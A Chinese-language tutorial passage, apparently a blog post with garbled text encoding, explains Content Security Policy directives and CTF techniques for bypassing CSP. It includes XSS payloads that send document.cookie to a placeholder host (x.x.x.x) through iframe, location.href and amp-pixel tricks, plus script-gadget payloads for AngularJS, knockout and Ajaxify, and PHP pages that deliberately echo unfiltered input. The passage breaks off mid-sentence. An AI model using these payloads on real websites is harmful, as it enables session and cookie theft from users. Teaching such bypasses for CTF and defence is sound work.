<div class="title-image"><img src="https://pic4.zhimg.com/v2-e5e1b10290e97ebb1855d6afe10f5721_b.jpg" alt=""></div><h2>CSPğŸ«</h2><p><b>0ï¸âƒ£CSPçš„ç”±æ¥ï¼Ÿ</b></p><p>ä¸€ä¸ªç®€å•çš„ XSS æ¼æ´é¡µé¢ï¼Œæ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œå°±åƒè¿™æ ·ï¼š</p><div class="highlight"><pre><code class="language-text">&lt;form&gt;
    &lt;input type=&#34;text&#34; name=&#34;name&#34; value=&#34;&lt;?php echo $_GET[&#34;name&#34;]; ?&gt;&#34; /&gt;
    &lt;input type=&#34;submit&#34; value=&#34;Submit&#34; /&gt;
&lt;/form&gt;</code></pre></div><p>å¯¹äºè¿™æ ·æ¯«æ— è¿‡æ»¤çš„é¡µé¢ï¼Œæˆ‘ä»¬å¯ä»¥è½»è€Œæ˜“ä¸¾çš„è¿›è¡Œ XSSã€‚</p><div class="highlight"><pre><code class="language-text">&#34;/&gt; &lt;script&gt;alert(0)&lt;/script&gt; &lt;!--</code></pre></div><p>å¯¹äºè¿™æ ·çš„æ¼æ´ç‚¹æ¥è¯´ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šä½¿ç”¨ htmlspecialchars å‡½æ•°æ¥è¿‡æ»¤è¾“å…¥ã€‚</p><blockquote>htmlspecialchars å‡½æ•°ï¼šå°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚</blockquote><div class="highlight"><pre><code class="language-text">&amp; (AND) =&gt; &amp;amp;
&#34; (åŒå¼•å·) =&gt; &amp;quot;
&#39; (å•å¼•å·) =&gt; &amp;#039;
&lt; (å°äºå·) =&gt; &amp;lt; 
&gt; (å¤§äºå·) =&gt; &amp;gt;</code></pre></div><p>ç±»ä¼¼çš„è¾“å…¥ç‚¹è¿˜æœ‰å¾ˆå¤šå¾ˆå¤šã€‚</p><div class="highlight"><pre><code class="language-html"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;xxx&#34;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">xxx</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;xxx&#34;</span><span class="p">&gt;</span></code></pre></div><p>åˆšæ‰çš„ htmlspecialchars å°±æ²¡æœ‰ä½œç”¨äº†ï¼Œä¸ºäº†æŠµå¾¡ XSSï¼Œæˆ‘ä»¬å¿…é¡»æƒ³æƒ³å…¶ä»–çš„æ–¹æ³•ã€‚</p><p>é¦–å…ˆæ˜¯ä¸€äº›ç‰¹æ®Šç¬¦å·ï¼Œæ¯”å¦‚ï¼š</p><div class="highlight"><pre><code class="language-text">% * , + â€“ / &lt; = &gt; ^ | ` ; &#34; &#39;</code></pre></div><p>å¦‚æœå°†è¿™äº›ç¬¦å·å…¨éƒ¨åŠ å…¥é»‘åå•ï¼Œé‚£æ­£å¸¸ç”¨æˆ·çš„è¾“å…¥å¿…å®šä¼šå—åˆ°é™åˆ¶ã€‚</p><p>æ‰€ä»¥ç¨‹åºçŒ¿å¼€å§‹ä½¿ç”¨ htmlspecialchars å‡½æ•° + é»‘åå• çš„è¿‡æ»¤æ–¹æ³•ã€‚</p><div class="highlight"><pre><code class="language-text">on\w+=
script
iframe
link
svg</code></pre></div><p>è¿™æ ·åšè™½ç„¶å·²ç»å¾ˆå®Œç¾äº†ï¼Œä½†æ˜¯ä¸èƒ½é˜²å¾¡ä»Šåä¼šå‘ç”Ÿçš„æƒ…å†µã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¯ä¸å¯ä»¥ä»æµè§ˆå™¨çš„å±‚é¢æ¥é˜²å¾¡ XSS æ¼æ´å‘¢ï¼Ÿ</p><p>ä¸æ˜¯ CSP å°±è¿™æ ·è¯ç”Ÿäº†ğŸ‰</p><p><b>1ï¸âƒ£ä»€ä¹ˆæ˜¯CSPï¼Ÿ</b></p><p>CSP çš„å®è´¨å°±æ˜¯ç™½åå•æœºåˆ¶ï¼Œå¯¹ç½‘ç«™åŠ è½½æˆ–æ‰§è¡Œçš„èµ„æºè¿›è¡Œå®‰å…¨ç­–ç•¥çš„æ§åˆ¶ã€‚</p><blockquote>CSP æŒ‡çš„æ˜¯å†…å®¹å®‰å…¨ç­–ç•¥ï¼Œä¸ºäº†ç¼“è§£å¾ˆå¤§ä¸€éƒ¨åˆ†æ½œåœ¨çš„è·¨ç«™è„šæœ¬é—®é¢˜ï¼Œæµè§ˆå™¨çš„æ‰©å±•ç¨‹åºç³»ç»Ÿå¼•å…¥äº†å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰çš„ä¸€èˆ¬æ¦‚å¿µã€‚è¿™å°†å¼•å…¥ä¸€äº›ç›¸å½“ä¸¥æ ¼çš„ç­–ç•¥ï¼Œä¼šä½¿æ‰©å±•ç¨‹åºåœ¨é»˜è®¤æƒ…å†µä¸‹æ›´åŠ å®‰å…¨ï¼Œå¼€å‘è€…å¯ä»¥åˆ›å»ºå¹¶å¼ºåˆ¶åº”ç”¨ä¸€äº›è§„åˆ™ï¼Œç®¡ç†ç½‘ç«™å…è®¸åŠ è½½çš„å†…å®¹ã€‚</blockquote><p>ç®€è€Œè¨€ä¹‹å°±æ˜¯ä¸ªé—¨ç¦ï¼Œåˆ·å¡æ‰èƒ½è¿›ã€‚</p><p><b>2ï¸âƒ£CSPçš„ä½œç”¨ï¼Ÿ</b></p><p>é˜² XSS ç­‰æ”»å‡»çš„åˆ©å™¨ã€‚</p><p>CSP çš„å®è´¨å°±æ˜¯ç™½åå•åˆ¶åº¦ï¼Œå¼€å‘è€…æ˜ç¡®å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œå“ªäº›å¤–éƒ¨èµ„æºå¯ä»¥åŠ è½½å’Œæ‰§è¡Œï¼Œç­‰åŒäºæä¾›ç™½åå•ã€‚å®ƒçš„å®ç°å’Œæ‰§è¡Œå…¨éƒ¨ç”±æµè§ˆå™¨å®Œæˆï¼Œå¼€å‘è€…åªéœ€æä¾›é…ç½®ã€‚</p><p>CSP å¤§å¤§å¢å¼ºäº†ç½‘é¡µçš„å®‰å…¨æ€§ã€‚æ”»å‡»è€…å³ä½¿å‘ç°äº†æ¼æ´ï¼Œä¹Ÿæ²¡æ³•æ³¨å…¥è„šæœ¬ï¼Œé™¤éè¿˜æ§åˆ¶äº†ä¸€å°åˆ—å…¥äº†ç™½åå•çš„å¯ä¿¡ä¸»æœºã€‚</p><p><b>3ï¸âƒ£CSPçš„åˆ†ç±»ï¼Ÿ</b></p><ol><li><b>Content-Security-Policyï¼š</b>é…ç½®å¥½å¹¶å¯ç”¨åï¼Œä¸ç¬¦åˆ CSP çš„å¤–éƒ¨èµ„æºå°±ä¼šè¢«é˜»æ­¢åŠ è½½ã€‚</li><li><b>Content-Security-Policy-Report-Onlyï¼š</b>è¡¨ç¤ºä¸æ‰§è¡Œé™åˆ¶é€‰é¡¹ï¼Œåªæ˜¯è®°å½•è¿åé™åˆ¶çš„è¡Œä¸ºã€‚å®ƒå¿…é¡»ä¸report-urié€‰é¡¹é…åˆä½¿ç”¨ã€‚</li></ol><h2>CSPç»“æ„ğŸ§ª</h2><p>CSPä¸­å¸¸è§çš„headerå­—æ®µä¸ºContent-Security-Policyã€‚  ä¸€ä¸ªCSPå¤´ç”±å¤šç»„CSPç­–ç•¥ç»„æˆï¼Œä¸­é—´ç”±åˆ†å·åˆ†éš”ï¼Œå¦‚ä¸‹ï¼š</p><div class="highlight"><pre><code class="language-text">Content-Security-Policy: default-src &#39;self&#39; www.twosecurity.com; script-src &#39;unsafe-inline&#39;</code></pre></div><p>å…¶ä¸­æ¯ä¸€ç»„ç­–ç•¥åŒ…å«ä¸€ä¸ªç­–ç•¥æŒ‡ä»¤å’Œä¸€ä¸ªå†…å®¹æºåˆ—è¡¨ã€‚</p><p><b>ç­–ç•¥æŒ‡ä»¤</b>ğŸ‘‡</p><p><b>default-src</b></p><p>default-src ä½œä¸ºæ‰€æœ‰å…¶ä»–æŒ‡ä»¤çš„å¤‡ç”¨ï¼Œä¸€èˆ¬æ¥è¯´ default-src &#39;none&#39;; script-src &#39;self&#39; è¿™æ ·çš„æƒ…å†µå°±ä¼šæ˜¯ script-src éµå¾ª selfï¼Œå…¶ä»–çš„éƒ½ä¼šä½¿ç”¨ noneã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé™¤äº†è¢«è®¾ç½®çš„æŒ‡ä»¤ä»¥å¤–ï¼Œå…¶ä½™æŒ‡ä»¤éƒ½ä¼šè¢«è®¾ç½®ä¸º default-src æŒ‡ä»¤æ‰€è®¾ç½®çš„å±æ€§ã€‚</p><p>è¯¥æŒ‡ä»¤åŒ…å«äº†ä»¥ä¸‹æŒ‡ä»¤ï¼š</p><ul><li>child-src</li><li>connect-src</li><li>font-src</li><li>img-src</li><li>media-src</li><li>object-src</li><li>script-src</li><li>style-src </li></ul><p><b>script-src</b></p><p>script-src æŒ‡ä»¤é™åˆ¶äº†æ‰€æœ‰ js è„šæœ¬å¯ä»¥è¢«æ‰§è¡Œçš„åœ°æ–¹ï¼ŒåŒ…æ‹¬é€šè¿‡é“¾æ¥æ–¹å¼åŠ è½½çš„è„šæœ¬ url ä»¥åŠæ‰€æœ‰å†…è”è„šæœ¬ï¼Œç”šè‡³åŒ…æ‹¬å„ç§æ–¹å¼çš„å¼•ç”¨ã€‚å…¶ä¸­è¿˜æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„å‚æ•°å« &#39;unsafe-inline&#39;ï¼Œå¦‚æœåŠ ä¸Šè¿™ä¸ªå‚æ•°ï¼Œå°±ä¸ä¼šé˜»æ­¢å†…è”è„šæœ¬ï¼Œä½†è¿™è¢«è®¤ä¸ºæ˜¯ä¸å®‰å…¨çš„ã€‚  </p><p>å¯¹äºè¿™ä¸ªå±æ€§æœ‰ä¸ªç‰¹æ®Šçš„é…ç½®å« unsafe-evalï¼Œå®ƒä¼šå…è®¸ä¸‹é¢å‡ ä¸ªå‡½æ•°ï¼š</p><div class="highlight"><pre><code class="language-text">eval() Function() setTimeout() with an initial argument which is not callable.setInterval() with an initial argument which is not callable.</code></pre></div><p><b>å…³é”®å­—ğŸ‘‡</b></p><p><b>&#39;none&#39;</b></p><p>ä»£è¡¨ç©ºé›†ï¼›å³ä¸åŒ¹é…ä»»ä½• URLã€‚ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„ã€‚</p><p><b>&#39;self&#39; </b></p><p>ä»£è¡¨å’Œæ–‡æ¡£åŒæºï¼ŒåŒ…æ‹¬ç›¸åŒçš„ URL åè®®å’Œç«¯å£å·ã€‚ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„ã€‚</p><p><b>&#39;unsafe-inline&#39; </b></p><p>å…è®¸ä½¿ç”¨å†…è”èµ„æºï¼Œå¦‚å†…è”çš„ script å…ƒç´ ã€javascript: URLã€å†…è”çš„äº‹ä»¶å¤„ç†å‡½æ•°å’Œå†…è”çš„ style å…ƒç´ ï¼Œä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„ã€‚</p><p><b>&#39;unsafe-eval&#39; </b></p><p>å…è®¸ä½¿ç”¨ eval() ç­‰é€šè¿‡å­—ç¬¦ä¸²åˆ›å»ºä»£ç çš„æ–¹æ³•ã€‚ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„ã€‚ </p><p><b>æ•°æ®</b>ğŸ‘‡</p><p><b>data: </b></p><p>å…è®¸ data: URI ä½œä¸ºå†…å®¹æ¥æºã€‚è¿™æ˜¯ä¸å®‰å…¨çš„ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥ç²¾å¿ƒæ„é€  data: URI æ¥æ”»å‡»ã€‚è¯·è°¨æ…åœ°ä½¿ç”¨è¿™ä¸ªæºï¼Œå¹¶ç¡®ä¿ä¸è¦ç”¨äºè„šæœ¬ã€‚</p><p><b>mediastream: </b></p><p>å…è®¸ mediastream: URI ä½œä¸ºå†…å®¹æ¥æºã€‚</p><div class="highlight"><pre><code class="language-text">Content-Security-Policy: default-src &#39;self&#39;; img-src &#39;self&#39; data:; media-src mediastream:</code></pre></div><p><b>CSPçš„ä½¿ç”¨ï¼Ÿ</b></p><p>ä¸€ï¼šåœ¨HTTP Headerä¸Šä½¿ç”¨</p><div class="highlight"><pre><code class="language-text">&#34;Content-Security-Policy:&#34; #ç­–ç•¥
&#34;Content-Security-Policy-Report-Only:&#34; #ç­–ç•¥</code></pre></div><p>äºŒï¼šåœ¨HTMLä¸Šä½¿ç”¨</p><div class="highlight"><pre><code class="language-text">&lt;meta http-equiv=&#34;content-security-policy&#34; content=&#34;#ç­–ç•¥&#34;&gt;
&lt;meta http-equiv=&#34;content-security-policy-report-only&#34; content=&#34;#ç­–ç•¥&#34;&gt;</code></pre></div><p>Meta æ ‡ç­¾ä¸ HTTP å¤´åªæ˜¯è¡Œå¼ä¸åŒè€Œä½œç”¨æ˜¯ä¸€è‡´çš„ï¼Œå¦‚æœ HTTP å¤´ä¸ Meta å®šä¹‰åŒæ—¶å­˜åœ¨ï¼Œåˆ™ä¼˜å…ˆé‡‡ç”¨ HTTP ä¸­çš„å®šä¹‰ã€‚</p><p>å¦‚æœç”¨æˆ·æµè§ˆå™¨å·²ç»ä¸ºå½“å‰æ–‡æ¡£æ‰§è¡Œäº†ä¸€ä¸ª CSP çš„ç­–ç•¥ï¼Œåˆ™ä¼šè·³è¿‡ Meta çš„å®šä¹‰ã€‚å¦‚æœ META æ ‡ç­¾ç¼ºå°‘ content å±æ€§ä¹ŸåŒæ ·ä¼šè·³è¿‡ã€‚</p><h2>CTFä¸­çš„CSPç»•è¿‡ğŸ’«</h2><p>è¿™é‡Œç®€å•ä»‹ç»å‡ ç§æ‹¿ cookie çš„ç»•è¿‡æ€è·¯ï¼Œæ²¡æœ‰æ¶‰åŠåˆ°çš„å¸Œæœ›å¤§ä½¬ä»¬è¯„è®ºåŒºè¡¥å……å®Œå–„ï¼Œå°å¼Ÿæ„Ÿæ¿€æ¶•é›¶ğŸ˜­ã€‚</p><p>CSPï¼š</p><div class="highlight"><pre><code class="language-php"><span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">,</span><span class="nx">md5</span><span class="p">(</span><span class="nx">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1000</span><span class="p">)));</span>
    <span class="p">}</span>
        <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Security-Policy: default-src &#39;self&#39;;&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>CSP<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>CSP<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>

<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&#34;Your GET content:&#34;</span><span class="o">.@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">];</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div><p><b>iframeç»•è¿‡</b></p><p>å¦‚æœæœ‰ä¸¤ä¸ªé¡µé¢ï¼š</p><div class="highlight"><pre><code class="language-php"><span class="c">&lt;!--a.php--&gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">,</span><span class="nx">md5</span><span class="p">(</span><span class="nx">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1000</span><span class="p">)));</span>
    <span class="p">}</span>
        <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Security-Policy: default-src &#39;self&#39;;&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span>

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>CSP<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>CSP<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&#34;Your GET content:&#34;</span><span class="o">.@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">];</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div><p class="ztext-empty-paragraph"><br/></p><div class="highlight"><pre><code class="language-php"><span class="c">&lt;!--b.php--&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>CSP<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>CSP<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>

<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&#34;Your GET content:&#34;</span><span class="o">.@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;twosecurity&#39;</span><span class="p">];</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div><p>å‰é¢çš„ a.php åšäº† CSP ä¿æŠ¤ç­–ç•¥ï¼Œè€Œ b.php æ²¡æœ‰ä¿æŠ¤ã€‚</p><p>soï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ b é¡µé¢æ–°å»º iframe ç”¨ javascript ç›´æ¥æ“ä½œ a é¡µé¢çš„ domï¼š</p><div class="highlight"><pre><code class="language-php"><span class="c">&lt;!-- xss ä»£ç ï¼Œè¦æ³¨æ„ url ç¼–ç  --&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kd">var</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">);</span>
<span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">&#34;./a.php&#34;</span><span class="p">;</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
<span class="nx">setTimeout</span><span class="p">(()=&gt;</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s1">&#39;http://x.x.x.x/cookie/&#39;</span><span class="o">+</span><span class="nx">escape</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">),</span><span class="mi">1000</span><span class="p">);</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></code></pre></div><p><b>locationç»•è¿‡</b></p><p>æœ‰çš„æƒ…å†µ csp ä¼šä½¿ç”¨ script-src &#39;unsafe-inline&#39;; è¿™ä¸ªåœ°æ–¹å¯ä»¥ç›´æ¥ç”¨location.href(window.location/window.open) ç»•è¿‡</p><div class="highlight"><pre><code class="language-text">127.0.0.1/csp/?twosecurity=&lt;script&gt;location.href=&#39;http://x.x.x.x/cookie/&#39;%2bescape(document.cookie);&lt;/script&gt;</code></pre></div><p><b>CDNç»•è¿‡</b></p><p>ä¸€èˆ¬æ¥è¯´ï¼Œå‰ç«¯ä¼šç”¨åˆ°è®¸å¤šçš„å‰ç«¯æ¡†æ¶å’Œåº“ï¼Œéƒ¨åˆ†ä¼ä¸šä¸ºäº†å‡è½»æœåŠ¡å™¨å‹åŠ›æˆ–è€…å…¶ä»–åŸå› ï¼Œå¯èƒ½ä¼šå¼•ç”¨å…¶ä»– CDN ä¸Šçš„ JS æ¡†æ¶ï¼Œå¦‚æœ CDN ä¸Šå­˜åœ¨ä¸€äº›ä½ç‰ˆæœ¬çš„æ¡†æ¶ï¼Œå°±å¯èƒ½å­˜åœ¨ç»•è¿‡ CSP çš„é£é™©ã€‚</p><blockquote>CDNï¼Œå³å†…å®¹åˆ†å‘ç½‘ç»œã€‚CDN æ˜¯æ„å»ºåœ¨ç°æœ‰ç½‘ç»œåŸºç¡€ä¹‹ä¸Šçš„æ™ºèƒ½è™šæ‹Ÿç½‘ç»œï¼Œä¾é éƒ¨ç½²åœ¨å„åœ°çš„è¾¹ç¼˜æœåŠ¡å™¨ï¼Œé€šè¿‡ä¸­å¿ƒå¹³å°çš„è´Ÿè½½å‡è¡¡ã€å†…å®¹åˆ†å‘ã€è°ƒåº¦ç­‰åŠŸèƒ½æ¨¡å—ï¼Œä½¿ç”¨æˆ·å°±è¿‘è·å–æ‰€éœ€å†…å®¹ï¼Œé™ä½ç½‘ç»œæ‹¥å¡ï¼Œæé«˜ç”¨æˆ·è®¿é—®å“åº”é€Ÿåº¦å’Œå‘½ä¸­ç‡ã€‚CDN çš„å…³é”®æŠ€æœ¯ä¸»è¦æœ‰å†…å®¹å­˜å‚¨å’Œåˆ†å‘æŠ€æœ¯ã€‚</blockquote><p>è¿™é‡Œçš„ CSP å¼•ç”¨äº† <a href="https://link.zhihu.com/?target=http%3A//cloudflare.com" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">http://</span><span class="visible">cloudflare.com</span><span class="invisible"></span></a> CDN æœåŠ¡ï¼Œäºæ˜¯å¯ä»¥é‡‡ç”¨äº†ä½ç‰ˆæœ¬çš„ angular js æ¨¡æ¿æ³¨å…¥æ¥ç»•è¿‡ CSPï¼Œå¦‚ä¸‹</p><div class="highlight"><pre><code class="language-text">&lt;!-- foo=&#34;--&gt;
&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;
&lt;/script&gt;
&lt;div ng-app&gt;
    {{constructor.constructor(&#39;alert(document.cookie)&#39;)()}}
&lt;/div&gt;
&#34; --&gt;</code></pre></div><p>å…¶åŸç†æ˜¯ï¼Œwaf å¯¹æ³¨é‡Šå®Œå…¨å¯ä¿¡ï¼Œæ‰€ä»¥æ„é€ ä¸€ä¸ª &lt;!-- foo=&#34;bar--&gt; &lt;script&gt;alert(1)&lt;/script&gt;&#34; --&gt;ï¼Œåªè¦é—­åˆæ³¨é‡Šå†…å®¹ï¼Œå°±å¯ä»¥è®©åé¢çš„å®Œå…¨å¯æ§ï¼Œå†åŠ ä¸Š <a href="https://link.zhihu.com/?target=https%3A//portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs" class=" wrap external" target="_blank" rel="nofollow noreferrer">Client-Side Template Injection</a> ä¸­çš„æ‰‹æ³•ï¼Œç»•è¿‡ CSPã€‚  </p><p>å­˜åœ¨ä½ç‰ˆæœ¬ angular js çš„ cdn æœåŠ¡å•†åˆ—è¡¨ï¼š<a href="https://link.zhihu.com/?target=https%3A//github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">github.com/google/csp-e</span><span class="invisible">valuator/blob/master/whitelist_bypasses/angular.js</span><span class="ellipsis"></span></a></p><p>é™¤äº†ä½ç‰ˆæœ¬ angular js çš„æ¨¡æ¿æ³¨å…¥ï¼Œè¿˜æœ‰è®¸å¤šåº“å¯ä»¥ç»•è¿‡ CSPã€‚</p><p>æ¯”å¦‚ï¼Œå¦‚æœç”¨äº† Jquery-mobile åº“ï¼Œä¸” CSP ä¸­åŒ…å« &#34;script-src &#39;unsafe-eval&#39;&#34; æˆ–è€… &#34;script-src &#39;strict-dynamic&#39;&#34;ï¼Œå¯ä»¥ç”¨è¿™ä¸ª expã€‚</p><div class="highlight"><pre><code class="language-text">&lt;div data-role=popup id=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;&lt;/div&gt;</code></pre></div><p>è¿˜æ¯”å¦‚ RCTF2018 é¢˜ç›®å‡ºç°çš„ AMP åº“ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ ‡ç­¾è·å–åå­—ä¸º FLAG çš„ cookieã€‚</p><div class="highlight"><pre><code class="language-text">&lt;amp-pixel src=&#34;http://x.x.x.x/?cid=CLIENT_ID(FLAG)&#34;&gt;&lt;/amp-pixel&gt;  </code></pre></div><p>ä»¥åŠï¼Œè¿™æ ·çš„ HTML ä»£ç ï¼š</p><div class="highlight"><pre><code class="language-text">&lt;div data-bind=&#34;value:&#39;hello world&#39;&#34;&gt;&lt;/div&gt;
</code></pre></div><p>å¯è¿™æ ·ç»•è¿‡å®ƒï¼š</p><div class="highlight"><pre><code class="language-text">switch (node.nodeType) {
    case 1: return node.getAttribute(â€œdata-bindâ€);
var rewrittenBindings = ko.expressionRewriting.preProcessBindings(bindingsString, options),
    functionBody = &#34;with($context){with($data||{}){return{&#34; + rewrittenBindings + &#34;}}}&#34;;
return new Function(&#34;$context&#34;, &#34;$element&#34;, functionBody);
return bindingFunction(bindingContext, node);</code></pre></div><p>è¿™äº›ä»£ç åˆ›å»ºäº†ä¸€ä¸ª eval() å±æ€§ã€‚</p><p>data-bind=&#34;value: foo&#34;  ==&gt;  eval(&#34;foo&#34;)</p><p>--------------------------------</p><p>ä¸ºäº†æ„å»º XSSï¼Œä¸€ä¸ªåŸºäº knockout çš„ JS åº”ç”¨ï¼Œæ”»å‡»è€…éœ€è¦æ³¨å…¥ï¼š</p><div class="highlight"><pre><code class="language-text">&lt;div data-bind=&#34;value: alert(1)&#34;&gt;&lt;/div&gt;</code></pre></div><p>--------------------------------</p><p>Ajaxify å°å·¥å…·ä½¿ç”¨ class=document-script å°†å…¶è½¬æ¢æˆè„šæœ¬å…ƒç´ ã€‚å¦‚æœä½ æœ‰ä¸€ä¸ª XSS åœ¨ä¸€ä¸ªç½‘ç«™ä¸Šä½¿ç”¨ Ajaxifyï¼Œä½ åªéœ€æ³¨å…¥ï¼š</p><p>Ajaxifyï¼š<a href="https://link.zhihu.com/?target=https%3A//github.com/browserstate/ajaxify" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">github.com/browserstate</span><span class="invisible">/ajaxify</span><span class="ellipsis"></span></a></p><div class="highlight"><pre><code class="language-text">&lt;div class=&#34;document-script&#34;&gt;alert(1)&lt;/div&gt;</code></pre></div><p>Ajaxify å°†ä¸ºä½ å®Œæˆåé¢çš„å·¥ä½œã€‚</p><p>--------------------------------</p><p>Bootstrap æ‹¥æœ‰â€œæœ€ç®€å•â€çš„å°å·¥å…·ï¼Œå°† HTML å±æ€§å€¼ä¼ é€’ç»™ innerHTMLã€‚</p><blockquote>Bootstrap æ˜¯åŸºäº HTMLã€CSSã€JavaScript å¼€å‘çš„ç®€æ´ã€ç›´è§‚ã€å¼ºæ‚çš„å‰ç«¯å¼€å‘æ¡†æ¶ï¼Œä½¿å¾— Web å¼€å‘æ›´åŠ 